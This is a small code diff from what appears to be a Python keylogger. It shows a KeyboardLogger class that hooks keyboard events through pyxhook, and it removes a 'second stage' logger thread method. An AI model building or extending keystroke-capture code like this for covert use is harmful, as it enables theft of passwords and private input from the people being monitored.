@@ -82,16 +82,9 @@ class Logger(threading.Thread):
     def get_username(self):
         return os.getenv('USER')
 
-    def spawn_second_stage_thread(self):
-        print(('[DEBUG]Entering second stage thread'),file=sys.stderr)
-        self.sst_q = queue.Queue(0)
-        self.sst = Logger(self.dir_lock,
-                self.sst_q, self.loggername)
-
 class KeyboardLogger:
     def __init__(self):
         self.spawn_event_threads()
-
         self.hm = pyxhook.HookManager()
         self.hm.HookKeyboard()
         self.hm.KeyDown = self.OnKeyDownEvent
